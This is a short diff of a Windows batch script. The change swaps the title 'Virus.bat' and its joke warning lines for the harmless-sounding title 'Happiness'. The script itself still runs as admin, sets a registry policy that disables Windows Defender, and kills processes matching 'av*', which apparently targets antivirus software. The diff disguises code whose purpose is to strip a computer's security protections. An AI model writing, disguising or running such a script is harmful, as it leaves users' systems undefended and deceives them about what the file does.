@@ -46,11 +46,7 @@
  ::::::::::::::::::::::::::::
  ::START
  ::::::::::::::::::::::::::::
-REM Run shell as admin - title Virus.bat
-echo ...
-echo Haha very funny right?
-echo Well say goodbye 
-echo
+REM Run shell as admin - title Happiness
 @echo off
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t "REG_DWORD" /d "1" /f
 tskill /A av*
